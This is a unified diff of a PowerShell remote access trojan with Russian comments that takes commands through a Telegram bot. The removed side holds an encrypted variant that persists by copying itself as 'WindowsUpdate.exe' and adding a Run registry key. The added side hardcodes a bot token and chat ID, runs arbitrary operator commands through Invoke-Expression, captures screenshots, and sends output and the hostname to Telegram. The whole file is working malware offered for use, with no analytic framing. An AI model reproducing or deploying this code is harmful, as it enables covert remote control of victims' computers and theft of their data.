@@ -1,50 +1,89 @@
-# Обфусцированный RAT для Telegram
-function Decrypt-String($encrypted) {
-    $bytes = [System.Convert]::FromBase64String($encrypted)
-    $iv = $bytes[0..15]
-    $data = $bytes[16..$bytes.Length]
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes("16byte_secret_key!")
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    [System.Text.Encoding]::UTF8.GetString($decryptor.TransformFinalBlock($data, 0, $data.Length))
-}
+# RAT для управления через Telegram бота
+# Токен бота: 8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU
+# Chat ID: 8367594494
 
-function Encrypt-String($plaintext) {
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes("16byte_secret_key!")
-    $aes.GenerateIV()
-    $encryptor = $aes.CreateEncryptor()
-    $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($plaintext), 0, $plaintext.Length)
-    [System.Convert]::ToBase64String($aes.IV + $encrypted)
-}
+$token = "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"
+$chatId = "8367594494"
+$lastUpdateId = 0
 
-# Установка персистентности
-$ratPath = "$env:TEMP\WindowsUpdate.exe"
-if (!(Test-Path $ratPath)) {
-    Copy-Item $MyInvocation.MyCommand.Path $ratPath
-    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d $ratPath /f
-}
-
-# Основной цикл RAT
-while ($true) {
+# Функция для отправки сообщений
+function Send-TelegramMessage {
+    param($text)
+    $url = "https://api.telegram.org/bot$token/sendMessage"
+    $body = @{
+        chat_id = $chatId
+        text = $text
+    }
     try {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot<8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU>/getUpdates" -TimeoutSec 30
+        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
+    }
+    catch {
+        Write-Host "Ошибка отправки сообщения: $($_.Exception.Message)"
+    }
+}
+
+# Функция для получения обновлений
+function Get-TelegramUpdates {
+    $url = "https://api.telegram.org/bot$token/getUpdates?offset=$($lastUpdateId + 1)&timeout=30"
+    try {
+        $updates = Invoke-RestMethod -Uri $url -Method Get
+        return $updates
+    }
+    catch {
+        Write-Host "Ошибка получения обновлений: $($_.Exception.Message)"
+        return $null
+    }
+}
+
+# Функция для выполнения команд
+function Invoke-CommandHandler {
+    param($command)
+    try {
+        $output = Invoke-Expression $command 2>&1 | Out-String
+        return $output
+    }
+    catch {
+        return "Ошибка выполнения команды: $($_.Exception.Message)"
+    }
+}
+
+# Основной цикл
+Send-TelegramMessage "RAT активирован на машине: $env:COMPUTERNAME"
+
+while ($true) {
+    $updates = Get-TelegramUpdates
+    if ($updates -and $updates.ok -eq $true) {
         foreach ($update in $updates.result) {
-            $message = Decrypt-String $update.message.text
-            if ($message -like "/cmd*") {
-                $command = $message.Substring(5)
-                $output = Invoke-Expression $command 2>&1 | Out-String
-                $encryptedOutput = Encrypt-String $output
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot<8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU>/sendMessage" -Method Post -Body @{
-                    chat_id = "8367594494>"
-                    text = $encryptedOutput
-                } | Out-Null
+            $lastUpdateId = $update.update_id
+            if ($update.message.text -like "/cmd*") {
+                $command = $update.message.text.Substring(4).Trim()
+                $output = Invoke-CommandHandler $command
+                Send-TelegramMessage "Результат выполнения '$command':`n$output"
+            }
+            elseif ($update.message.text -eq "/screenshot") {
+                # Функция для создания скриншота
+                Add-Type -AssemblyName System.Windows.Forms
+                Add-Type -AssemblyName System.Drawing
+                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                $tempFile = "$env:TEMP\screenshot.png"
+                $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
+                $graphics.Dispose()
+                $bitmap.Dispose()
+                Send-TelegramMessage "Скриншот сохранен: $tempFile"
+            }
+            elseif ($update.message.text -eq "/help") {
+                $helpMessage = @"
+Доступные команды:
+/cmd [command] - выполнить команду PowerShell
+/screenshot - сделать скриншот
+/help - показать справку
+"@
+                Send-TelegramMessage $helpMessage
             }
         }
     }
-    catch {
-        Start-Sleep -Seconds 60
-    }
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 5
 }
